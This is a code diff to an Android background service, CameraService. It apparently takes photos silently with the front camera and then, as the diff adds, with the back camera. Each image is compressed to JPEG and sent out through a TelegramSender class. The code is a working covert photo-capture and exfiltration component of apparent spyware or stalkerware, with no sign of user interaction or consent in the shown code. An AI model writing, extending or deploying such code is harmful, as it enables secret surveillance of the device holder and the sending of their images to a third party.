@@ -32,7 +32,7 @@ public class CameraService extends Service {
         startForeground(1, n);
         
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-        capturePhoto("face", "1"); // 1 = фронтальная
+        capturePhoto("front", "1"); 
         return START_NOT_STICKY;
     }
 
@@ -73,12 +73,20 @@ public class CameraService extends Service {
                         
                         YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                         ByteArrayOutputStream out = new ByteArrayOutputStream();
-                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 80, out);
+                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 75, out);
                         
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                         
                         img.close(); r.close(); device.close();
-                        stopSelf();
+                        
+                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                            if (tag.equals("front")) {
+                                capturePhoto("back", "0");
+                            } else {
+                                stopSelf();
+                            }
+                        }, 300);
+                        
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
